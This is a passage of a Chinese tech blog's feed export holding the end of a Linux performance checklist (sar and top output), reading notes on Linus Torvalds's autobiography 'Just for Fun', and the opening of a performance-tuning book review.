class="number">3.25</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span></span><br><span class="line"><span class="number">12</span>:<span class="number">16</span>:<span class="number">50</span> AM docker0 <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span></span><br><span class="line">^C</span><br></pre></td></tr></table></figure>
<p>使用这个工具用来检查网络接口吞吐量：<strong>rxkB/s</strong> 和<strong> txkB/s</strong>, 作为负载的一种度量方式, 也可以用来检查是否已经达到某种瓶颈。</p>
<p>在上面的例子中，网卡 eth0 收包大道 22 Mbytes/s, 即176 Mbits/sec (就是说，在 1 Gbit/sec 的限制之内)。此版本也有一个体现设备利用率的 “％ifutil” （两个方向最大值），我们也可以使用 Brendan的nicstat 工具来度量。和 nicstat 类似，这个值很难准确获取，看起来在这个例子中并没有起作用（0.00）。</p>
<h4 id="9-sar-n-TCP-ETCP-1"><a href="#9-sar-n-TCP-ETCP-1" class="headerlink" title="9. sar n TCP,ETCP 1"></a>9. sar n TCP,ETCP 1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ sar -n TCP,ETCP <span class="number">1</span></span><br><span class="line">Linux <span class="number">3.13</span><span class="number">.0</span><span class="number">-49</span>-generic (titanclusters-xxxxx) <span class="number">07</span>/<span class="number">14</span>/<span class="number">2015</span> _x86_64_ (<span class="number">32</span> CPU)</span><br><span class="line"><span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> AM active/s passive/s iseg/s oseg/s</span><br><span class="line"><span class="number">12</span>:<span class="number">17</span>:<span class="number">20</span> AM <span class="number">1.00</span> <span class="number">0.00</span> <span class="number">10233.00</span> <span class="number">18846.00</span></span><br><span class="line"><span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> AM atmptf/s estres/s retrans/s isegerr/s orsts/s</span><br><span class="line"><span class="number">12</span>:<span class="number">17</span>:<span class="number">20</span> AM <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span></span><br><span class="line"><span class="number">12</span>:<span class="number">17</span>:<span class="number">20</span> AM active/s passive/s iseg/s oseg/s</span><br><span class="line"><span class="number">12</span>:<span class="number">17</span>:<span class="number">21</span> AM <span class="number">1.00</span> <span class="number">0.00</span> <span class="number">8359.00</span> <span class="number">6039.00</span></span><br><span class="line"><span class="number">12</span>:<span class="number">17</span>:<span class="number">20</span> AM atmptf/s estres/s retrans/s isegerr/s orsts/s</span><br><span class="line"><span class="number">12</span>:<span class="number">17</span>:<span class="number">21</span> AM <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span> <span class="number">0.00</span></span><br><span class="line">^C</span><br></pre></td></tr></table></figure>
<p>这是一个关键TCP指标的概览视图。包括：</p>
<ul>
<li><strong>active/s</strong>: 本地初始化的 TCP 连接数 ／每秒（例如，通过connect() ）</li>
<li><strong>passive/s</strong>: 远程初始化的 TCP 连接数／每秒（例如，通过accept() ）</li>
<li><strong>retrans/s</strong>: TCP重发数／每秒</li>
</ul>
<p>这些活跃和被动的计数器常常作为一种粗略的服务负载度量方式：新收到的连接数 (被动的),以及下行流量的连接数 (活跃的)。这也许能帮助我们理解，活跃的都是外向的，被动的都是内向的，但是严格来说这种说法是不准确的（例如，考虑到“本地－本地”的连接）。重发数是网络或服务器问题的一个标志；它也许是因为不可靠的网络（如，公共互联网），也许是由于一台服务器已经超负荷、发生丢包。<br>上面的例子显示每秒钟仅有一个新的TCP连接。</p>
<h4 id="10-top"><a href="#10-top" class="headerlink" title="10. top"></a>10. top</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ top</span><br><span class="line">top - <span class="number">00</span>:<span class="number">15</span>:<span class="number">40</span> up <span class="number">21</span>:<span class="number">56</span>, <span class="number">1</span> user, load average: <span class="number">31.09</span>, <span class="number">29.87</span>, <span class="number">29.92</span></span><br><span class="line">Tasks: <span class="number">871</span> total, <span class="number">1</span> running, <span class="number">868</span> sleeping, <span class="number">0</span> stopped, <span class="number">2</span> zombie</span><br><span class="line">%Cpu(s): <span class="number">96.8</span> us, <span class="number">0.4</span> sy, <span class="number">0.0</span> ni, <span class="number">2.7</span> id, <span class="number">0.1</span> wa, <span class="number">0.0</span> hi, <span class="number">0.0</span> si, <span class="number">0.0</span> st</span><br><span class="line">KiB Mem: <span class="number">25190241</span>+total, <span class="number">24921688</span> used, <span class="number">22698073</span>+<span class="built_in">free</span>, <span class="number">60448</span> buffers</span><br><span class="line">KiB Swap: <span class="number">0</span> total, <span class="number">0</span> used, <span class="number">0</span> <span class="built_in">free</span>. <span class="number">554208</span> cached Mem</span><br><span class="line">PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND</span><br><span class="line"><span class="number">20248</span> root <span class="number">20</span> <span class="number">0</span> <span class="number">0.227</span>t <span class="number">0.012</span>t <span class="number">18748</span> S <span class="number">3090</span> <span class="number">5.2</span> <span class="number">29812</span>:<span class="number">58</span> java</span><br><span class="line"><span class="number">4213</span> root <span class="number">20</span> <span class="number">0</span> <span class="number">2722544</span> <span class="number">64640</span> <span class="number">44232</span> S <span class="number">23.5</span> <span class="number">0.0</span> <span class="number">233</span>:<span class="number">35.37</span> mesos-slave</span><br><span class="line"><span class="number">66128</span> titancl+ <span class="number">20</span> <span class="number">0</span> <span class="number">24344</span> <span class="number">2332</span> <span class="number">1172</span> R <span class="number">1.0</span> <span class="number">0.0</span> <span class="number">0</span>:<span class="number">00.07</span> top</span><br><span class="line"><span class="number">5235</span> root <span class="number">20</span> <span class="number">0</span> <span class="number">38.227</span>g <span class="number">547004</span> <span class="number">49996</span> S <span class="number">0.7</span> <span class="number">0.2</span> <span class="number">2</span>:<span class="number">02.74</span> java</span><br><span class="line"><span class="number">4299</span> root <span class="number">20</span> <span class="number">0</span> <span class="number">20.015</span>g <span class="number">2.682</span>g <span class="number">16836</span> S <span class="number">0.3</span> <span class="number">1.1</span> <span class="number">33</span>:<span class="number">14.42</span> java</span><br><span class="line"><span class="number">1</span> root <span class="number">20</span> <span class="number">0</span> <span class="number">33620</span> <span class="number">2920</span> <span class="number">1496</span> S <span class="number">0.0</span> <span class="number">0.0</span> <span class="number">0</span>:<span class="number">03.82</span> init</span><br><span class="line"><span class="number">2</span> root <span class="number">20</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> S <span class="number">0.0</span> <span class="number">0.0</span> <span class="number">0</span>:<span class="number">00.02</span> kthreadd</span><br><span class="line"><span class="number">3</span> root <span class="number">20</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> S <span class="number">0.0</span> <span class="number">0.0</span> <span class="number">0</span>:<span class="number">05.35</span> ksoftirqd/<span class="number">0</span></span><br><span class="line"><span class="number">5</span> root <span class="number">0</span> <span class="number">-20</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> S <span class="number">0.0</span> <span class="number">0.0</span> <span class="number">0</span>:<span class="number">00.00</span> kworker/<span class="number">0</span>:<span class="number">0</span>H</span><br><span class="line"><span class="number">6</span> root <span class="number">20</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> S <span class="number">0.0</span> <span class="number">0.0</span> <span class="number">0</span>:<span class="number">06.94</span> kworker/u256:<span class="number">0</span></span><br><span class="line"><span class="number">8</span> root <span class="number">20</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> S <span class="number">0.0</span> <span class="number">0.0</span> <span class="number">2</span>:<span class="number">38.05</span> rcu_sched</span><br></pre></td></tr></table></figure>
<p>top命令包含了许多我们之前已经检查的指标。它可以非常方便地运行，看看是否任何东西看起来与从前面的命令的结果完全不同，可以表明负载指标是不断变化的。顶部下面的输出，很难按照时间推移的模式查看，可能使用如 vmstat 和 pidstat 等工具会更清晰，它们提供滚动输出。如果你保持输出的动作不够快 （CtrlS 要暂停，CtrlQ 继续），屏幕将清除，间歇性问题的证据也会丢失。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>故障检查过程中，人的作用主要是作出决策。遗忘、遗漏、麻痹、松懈是每个人都会犯的错误，好的公司都会根据经验编制检查单，提高工作效率，降低人为失误发生的概率。出于竞争因素考虑，应该充分重视检查单的更新、完善、自动化，以此为基础建立自己的技术壁垒。</p>
<h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="扩展阅读：性能诊断指南"><a href="#扩展阅读：性能诊断指南" class="headerlink" title="扩展阅读：性能诊断指南"></a>扩展阅读：性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="扩展阅读：How-Linux-Works"><a href="#扩展阅读：How-Linux-Works" class="headerlink" title="扩展阅读：How Linux Works"></a>扩展阅读：How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="扩展阅读：动态追踪技术"><a href="#扩展阅读：动态追踪技术" class="headerlink" title="扩展阅读：动态追踪技术"></a>扩展阅读：动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://medium.com/netflix-techblog/linux-performance-analysis-in-60-000-milliseconds-accc10403c55">Netflix Technology Blog:Linux Performance Analysis in 60,000 Milliseconds</a></li>
<li><a href="http://news.carnoc.com/list/409/409763.html">从《清单革命》看飞行检查单</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>科技史漫谈：Linus Torvalds 与 Linux 操作系统</title>
    <url>/2016/04/24/LinusTorvalds/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>The mind behind Linux</li>
<li>Just for Fun ！</li>
</ul>
<blockquote>
<p>Linus 无疑是一个顶级黑客，想想有多少人能从零开始建造一个完整的具有产品级质量的操作系统内核？ — 《大教堂与集市》<br><span id="more"></span></p>
</blockquote>
<h2 id="Linus-Torvalds"><a href="#Linus-Torvalds" class="headerlink" title="Linus Torvalds"></a>Linus Torvalds</h2><p>born December 28, 1969. is a Finnish-American software engineer who is the creator and, for a long time, principal developer, of the Linux kernel;<br>which became the kernel for operating systems such as the Linux operating system, Android, and Chrome OS.<br>He also created the distributed revision control system Git.</p>
<h2 id="一、TED-Talks：The-mind-behind-Linux"><a href="#一、TED-Talks：The-mind-behind-Linux" class="headerlink" title="一、TED Talks：The mind behind Linux"></a>一、TED Talks：The mind behind Linux</h2><ol>
<li><p><a href="http://www.jianshu.com/p/841862adb059">（中文翻译）Linus Torvalds: The mind behind Linux</a></p>
</li>
<li><p><a href="https://www.ted.com/talks/linus_torvalds_the_mind_behind_linux?language=en#t-1278100">TED现场版</a></p>
</li>
</ol>
<p><img src="http://riboseyim-qiniu.riboseyim.com/global-view.png" alt=""></p>
<h1 id="二、Linux-之父：Just-for-Fun-！"><a href="#二、Linux-之父：Just-for-Fun-！" class="headerlink" title="二、Linux 之父：Just for Fun ！"></a>二、Linux 之父：Just for Fun ！</h1><h2 id="读书笔记（序）"><a href="#读书笔记（序）" class="headerlink" title="读书笔记（序）"></a>读书笔记（序）</h2><p>《Just for Fun: The Story of an Accidental Revolutionary》，是Linux内核的创建者林纳斯·托瓦兹（Linus Torvalds）的自传。这本书由他和大卫·戴蒙德（David Diamond）联合撰写，叙述林纳斯·托瓦兹从小的成长历程、创建Linux内核、Git的过程以及软件世界的江湖恩怨。全书主体部分采用一问一答的访谈形式，由戴蒙德在他们的的汽车旅行过程中记录完成；另外一部分收录了林纳斯的几篇专题论述文章，比如作者关于软件版权的一些批判性意见。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Linus_Torvalds_BookTheme.png" alt=""></p>
<h2 id="I-was-an-ugly-child-I-was-a-nerd-I-was-A-geek"><a href="#I-was-an-ugly-child-I-was-a-nerd-I-was-A-geek" class="headerlink" title="I was an ugly child.I was a nerd.I was A geek."></a>I was an ugly child.I was a nerd.I was A geek.</h2><p>关于自己的童年，林纳斯显然有着强烈的阴影。首先，他自认为是一个长得非常丑的孩子(ugly: unpleasant to look)。具体来说就包括极度没品味的衣着，Torvalds家族标志性的大鼻子，不擅长体育运动、腼腆害羞以及最重要的：很难引起妹子的关注(关于这一点，老林在全书多次反复提到)。</p>
<p>Nerd一词本来原意“a person who is boring, stupid and not fashionable”。俚语中一个稍含贬义的用语，一般指偏爱钻研书本知识，将大量闲暇用于脑力工作，对流行文化不感兴趣，而不愿或不善于体育活动或其他社会活动的人。相对于那些擅长体育、四肢发达、自信且善于泡妞的人来说，nerd的青春说起来都是眼泪啊。</p>
<p>geek和nerd这个词类似，江湖俗称发烧友或怪咖，通常被用于形容对计算机和网络技术有狂热兴趣并投入大量时间钻研的人。它们现在已经在IT圈里流行起来，逐渐从贬义词变成了具有自豪感和身份认同意义的词语，很多中关村或深圳的咖啡店里面都有很多自称Geek的人在和各路投资人畅聊IPO的美好图景。我想这显然归功于林纳斯这代牛人不遗余力地科普推广。</p>
<h2 id="Tell-you-about-Family"><a href="#Tell-you-about-Family" class="headerlink" title="Tell you about Family."></a>Tell you about Family.</h2><p>关于Torvalds家族，主要有三个特点：</p>
<ol>
<li>教授之家<br>林纳斯·托瓦兹的外祖父家族原来只是贫穷的农民，直到外祖父那一代，六兄弟中有两人获得博士学位。（p13）Leo Törnqvist是芬兰第一批统计学教授，同时意外地开启了林纳斯的编程之路。教授购买了一台Commodore VIC 20电脑，期望用户解决工作中遇到的统计计算问题，显然老教授并不善此道。彼时小林纳斯11岁，仅仅是因为好玩，通过阅读手册自学了指令集，并开始使用BASIC语言编写一些统计学方面的小程序。</li>
</ol>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Linus_Torvalds_Family_201705.png" alt=""></p>
<ol>
<li>破碎之家（dysfunctional family）<br>林纳斯的父母在他很小的时候就离异了。“At times we lived with my dad and his girlfriend, at other times Sara lived with my dad and I lived with my mom.At times both of us lived with my mom.” 他的祖父晚年中风，祖母也年老体弱，一家老小挤在一所旧房子里。作为职业女性，林纳斯的母亲经常需要工作到很晚，林纳斯只得和妹妹自己去购物、安排晚餐。在艰难的日子里，电脑是唯一的寄托。“The computer found a home on a tiny desk against the window, maybe two feet from my bed.(p19)”</li>
</ol>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Linux_Torvalds_VIC20.jpg" alt=""></p>
<ol>
<li>左派之家<br>Torvalds家族的一大鲜明特色就是左翼传统。祖父是一名诗人和记者，父亲、母亲都是记者，曾是芬兰学生运动、左翼社会运动的活跃分子。直到林纳斯，坚持开放源代码理念也就顺理成章了。他本人对于金钱本身一直也没什么概念，直到1999年，Red Hat公司依靠Linux赚到不好意思以后，主动要求赠送一大笔股票期权给林纳斯（估值2000万美元）。在黑客的江湖里，林纳斯也许是最知名的“喷子”之一：例如，抨击Nvidia是他所接触过的“最烂的公司”（the worst company）和 “最麻烦的公司”（the worst trouble spot），有一次与人争论Git为何不使用C++开发时与对方用“放屁”（原文为“bullshit”、“BS”）互骂，更曾以“一群自慰的猴子”（原文为“OpenBSD crowd is a bunch of masturbating monkeys”）来称呼OpenBSD团队。不用奇怪，这也许只是他们家的记者基因灵魂附体而已。</li>
</ol>
<h3 id="About-Finnish-Army"><a href="#About-Finnish-Army" class="headerlink" title="About Finnish Army"></a>About Finnish Army</h3><p>1989年，大学二年级，林纳斯加入芬兰国防军服11个月的国家义务兵役，军衔少尉，领导一个四、五个人小团队。他们的工作是负责火炮控制单元，大概是指示目标、弹道计算之类。<br>林纳斯无意于军官职业，也不喜好当领导，军旅生活中最重要的一件事就是看书：</p>
<blockquote>
<p>So there were two things I did that summer.Nothing.And read the 719 pages of <strong>《Operating System:Design and Implementation》</strong></p>
</blockquote>
<p>《操作系统：设计与实现》，作者Andrew S. Tanenbaum的这本书，激活了这位年轻人的视野，促成了林纳斯从事操作系统开发的职业生涯。</p>
<p>不管怎么说，林纳斯对于这段生活是非常感念的：</p>
<blockquote>
<p>some people suggest that the major reason for the required army duty is to give Finnish men something to talk about over beer for as long as they live.They all have something miserable in common.They hated the Army, but they’re happy to talk about it afterward.(p30)</p>
</blockquote>
<h3 id="Tell-you-about-Finland"><a href="#Tell-you-about-Finland" class="headerlink" title="Tell you about Finland."></a>Tell you about Finland.</h3><p>在这么略带自黑的幽默自传中，作者对祖国芬兰的深情溢于言表。</p>
<p>芬兰地处严寒，有四分之一的地方处在北极圈内，最北的地区夏天有73天太阳不落于地平线下，冬天则有51天不出太阳。大概有500多万居民，93%的人使用芬兰语，大部分可以说英语。70%以上的人属于芬兰信义宗教会（路德宗）的成员。最大的民俗特点就是：一：低调内敛、不爱说话，如果有什么事他们更爱发短信（诺基亚手机发短信还真是无敌）二：宅，死宅！中国的国粹是麻将，芬兰的国粹就是桑拿浴，或者说桑拿才是芬兰真正的国家宗教。“Nobody actually knows how this religion started, but the tradition, at least in some places, is to build the sauna first, then the house.” (芬兰谚语：先建桑拿，再搭房屋)</p>
<p>芬兰的教育系统让人印象深刻，有一种英特纳雄耐尔已经实现的即时感。<br>教育国策一：教育免费。不仅免学费、而且提供全额伙食补助。不仅保障城里人就近入学，还为偏远地区学生提供免费交通运输系统。<br>教育国策二：学术教育与职业教育平衡发展。高中就有学术性的文理高中和职业高中，高等教育分成“研究性大学”(university) 以及科技大学(芬兰语ammattikorkeakoulu)系统。<br>500万人口的小国居然有17间大学以及27间科技大学。<br>教育国策二：教育平等。天朝惯有的排名制、淘汰法，是在国家法律和社会信仰层面所不能容忍的。教育系统不使用淘汰，分组或是放弃任何一位学生。</p>
<blockquote>
<p>Finnish schools don’t separate out the good students-or the losers.(p25)</p>
</blockquote>
<p>对于林纳斯这类一度具有阅读障碍的“Math Guy”，在某些方面（体育、社交等）非常自卑的人来说，并不妨碍他们过上好日子。芬兰教育系统有着非常丰富的奖学金体系，例如林纳斯的第一部电脑，就是通过高中时代的奖学金购买的（估值500欧元，5000元人民，算上那个年代的购买力，少说上万）。那可是1980年代，计算机才刚刚个人化，是非常昂贵的设备。就算30多年后今天，中国任何一所普通高中每学期的单科奖学金到万元标准的也不多吧。</p>
<blockquote>
<p>The biggest ones were on the order of $500. So that’s where most of the money for my second computer came from.</p>
</blockquote>
<p>据说今年在克强CEO的严重关切和亲自督战下，财政部和教育部把中国高校博士生的津贴从每生每年12000元大幅提高到15000元，即每生每月提高250元。还真不如一个芬兰的高中生。<br>所以，关键问题都要看数字。科教兴国是不是扯淡，领导是不是真的重视你，只要看账上那点饷银就清楚了。</p>
<h2 id="meaning-for-life"><a href="#meaning-for-life" class="headerlink" title="meaning for life"></a>meaning for life</h2><blockquote>
<p>There are three things that have meaning for life.They are the motivational factors for everything in your life——for anything that you do or any living thing does:The first is survival, the second is social order, and the third is entertainment. Everything in life progresses in that order.And there is nothing after entertainment. So, in a sense, the implication is that the meaning of life is to reach that third stage. And once you’ve reached the third stage, you’re done. But you have to go through the other stages first.</p>
</blockquote>
<p>“人类的追求分成三个阶段。第一是生存，第二是社会秩序，第三是娱乐。最明显的例子是性，它开始只是一种延续生命的手段，后来变成了一种社会行为，比如你要结婚才能得到性。再后来，它成了一种娱乐。” （是不是有点离经叛道? 我竟无力反驳)</p>
<blockquote>
<p>It started out as survival, but it became a social thing.That’s why you get married.And then it becomes entertainment.</p>
</blockquote>
<p>“技术最初也是为了生存，为了生存得更好。现在技术大体上还处于社会的层面，但正在朝娱乐的阶段发展。……（Linux的开发模式）为人们提供了依靠兴趣与热情而生活的机会。与世界上最好的程序员一起工作，是一种无与伦比的享受。”</p>
<blockquote>
<p>Technology came about as survival.And survival is not about just surviving, it’s about surviving better.</p>
</blockquote>
<p>人生在世，Just for fun.</p>
<p>What can I do to make society better?<br>You known that you’re a part of society.You known that society is moving in this direction.<br>You can help society move in this direction.</p>
<h3 id="Introduction-Post-its-from-a-Revolution"><a href="#Introduction-Post-its-from-a-Revolution" class="headerlink" title="Introduction:Post-its from a Revolution"></a>Introduction:Post-its from a Revolution</h3><h3 id="Acknowledgments"><a href="#Acknowledgments" class="headerlink" title="Acknowledgments"></a>Acknowledgments</h3><h3 id="Preface-The-Meaning-of-Life-I-Sex-War-Linux"><a href="#Preface-The-Meaning-of-Life-I-Sex-War-Linux" class="headerlink" title="Preface:The Meaning of Life I (Sex,War,Linux)"></a>Preface:The Meaning of Life I (Sex,War,Linux)</h3><h3 id="BIRTH-OF-A-NERD"><a href="#BIRTH-OF-A-NERD" class="headerlink" title="BIRTH OF A NERD"></a>BIRTH OF A NERD</h3><p>I.   I was an ugly child. I was a nerd. A geek.</p>
<p>II.  My earliest and happiest memories involve playing with my grandfather’s old electronic calculator.</p>
<p>III. Tell you about Finland &amp; Family</p>
<p>IV.  Family History (more details)</p>
<p><strong>Talk: Linus Torvalds &amp; David Diamond</strong></p>
<p>an editor of the San Jose Mercury News Sunday magazine<br>Mercury来自罗马神话中的信使和商旅之神墨丘利，代表为神人之间传达信息，同时意指淘金热时期在圣荷西邻近富有的水银矿脉(Mercury)，一语双关，故合并后保留原名。<br>但在中文刊物中，偶有误译为《圣荷西水星报》。一般认为，《圣荷西信使报》是全世界第一家最早发展网路新闻产业的先驱。其时间可追溯至1992年，另一说是1987年。</p>
<p><strong>Talk about Bill Gates</strong></p>
<blockquote>
<p>he wasn’t the least bit interested in even meeting the guy.”There wouldn’t be much of a connection point,” he reasoned. “I’m completely uninterested in the thing that he’s the best in the world at. And he’s not interested in the thing that maybe I’m the best in the world at.I couldn’t give him advice in business and he couldn’t give me advice in technology.”</p>
</blockquote>
<p><strong>Talk about Richard Stallman</strong><br>the God of Free Software.(p58)</p>
<p>V.   High School</p>
<p>VI.  University of Helsinki &amp; Finnish Army</p>
<p>VII. Tell you some more about Finland (Sauna，Silence tradition and educational system)</p>
<h3 id="BIRTH-OF-AN-OPERATING"><a href="#BIRTH-OF-AN-OPERATING" class="headerlink" title="BIRTH OF AN OPERATING"></a>BIRTH OF AN OPERATING</h3><h3 id="KING-OF-THE-BALL"><a href="#KING-OF-THE-BALL" class="headerlink" title="KING OF THE BALL"></a>KING OF THE BALL</h3><p>  Intellectual Property 204<br>  An End to Control     215<br>  The Amusement Ride Ahead 220<br>  Why Open Source Makes Sense 225<br>  Fame and Fortune<br>  The Meaning of Life II 242</p>
<h3 id="Index-251"><a href="#Index-251" class="headerlink" title="Index 251"></a>Index 251</h3><h2 id="扩展阅读：Linux-操作系统"><a href="#扩展阅读：Linux-操作系统" class="headerlink" title="扩展阅读：Linux 操作系统"></a>扩展阅读：Linux 操作系统</h2><ul>
<li><a href="https://riboseyim.github.io/2016/04/24/LinusTorvalds/">《Linus Torvalds:Just for Fun》</a></li>
<li><a href="https://riboseyim.github.io/2017/04/26/Linux-Commands/">Linux 常用命令一百条</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Load/">Linux 性能诊断:负载评估</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断:快速检查单(Netflix版)</a></li>
<li><a href="https://riboseyim.github.io/2017/10/24/Linux-Perf-Picture/">Linux 性能诊断：荐书|《图解性能优化》</a></li>
<li><a href="https://riboseyim.github.io/2017/10/24/Linux-Perf-Wan/">Linux 性能诊断：Web应用性能优化</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（二）：User Space &amp; RAM</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Works-Memory/">操作系统原理 | How Linux Works（三）：Memory</a></li>
</ul>
<h2 id="推荐：电子书《Linux-Perf-Master》"><a href="#推荐：电子书《Linux-Perf-Master》" class="headerlink" title="推荐：电子书《Linux Perf Master》"></a>推荐：电子书《Linux Perf Master》</h2><p>发表在GitBook平台，欢迎订阅、下载、批评指正:</p>
<p><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ebook-linuxperfmaster-1.png" alt=""></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li>《Just for Fun》<br>副题：The Story of an Accidental Revolutionary<br>作者：Linus Torvalds 、 David Diamond<br>售价：USA $14.99/CAN $18.50<br>Paperback: 288 pages<br>Publisher: HarperBusiness; Reprint edition (June 4, 2002)<br>Language: English<br>ISBN-10: 0066620732<br>ISBN-13: 978-0066620732<br>出版年份：2001年<br>阅读进度：201704～201705</li>
</ol>
<p>Linus Torvalds was born in Finland and graduated from the University of Helsinki.<br>He lives in San Jose, California.</p>
<p>David Diamond has written for the New York Times,Wired,USA Weekend, and many other publications.<br>He lives in Kentfield, California.</p>
<ol>
<li><p><a href="http://www.softpanorama.org/People/Torvalds/summing_up.shtml#Vanity%20Fair%20Autobiography">关于Torvalds及《Just For Fun》的批评意见</a><br>I think that Linus Torvalds succeed first a foremost as an author of a “new BIOS”, a POSIX-compatible kernel implementation which became a de-facto standard<br>“Linux is moving away from its founding ideals and not even Linus Torvalds can change it”.</p>
</li>
<li><p><a href="http://www.ruanyifeng.com/blog/2012/09/linus_torvalds.html">阮一峰：《Linus Torvalds自传》摘录,20120903</a></p>
</li>
<li><p><a href="https://zh.wikipedia.org/wiki/芬蘭教育">维基百科：芬兰教育</a></p>
</li>
</ol>
<ul>
<li><a href="https://riboseyim.github.io/2016/04/24/LinusTorvalds/">About Linus Torvalds </a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>OpenSource</tag>
        <tag>Engineering</tag>
        <tag>History</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 性能诊断:荐书《图解性能优化》</title>
    <url>/2017/10/24/Linux-Perf-Picture/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>性能分析的基础:吞吐和响应的区别</li>
<li>实际系统中的性能分析</li>
<li>性能调优</li>
<li>性能测试</li>
<li>虚拟化环境下的性能</li>
<li>云环境下的性能<span id="more"></span>
</li>
</ul>
<h3 id="一、性能分析的基础"><a href="#一、性能分析的基础" class="headerlink" title="一、性能分析的基础"></a>一、性能分析的基础</h3><ul>
<li><p>响应和吞吐的区别（初学者可能经常会混淆的概念）<br>响应：表示应答的快慢<br>吞吐：表示处理数量的多少<br>案例：“明明优化了机器的配置，但性能并没有提高”。响应有问题，却增加了CPU核心数，只是增加了空转的CPU核心而已。所以要养成习惯，先确认问题是出在响应还是吞吐上。<br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_suanfa_7.png" alt=""></p>
</li>
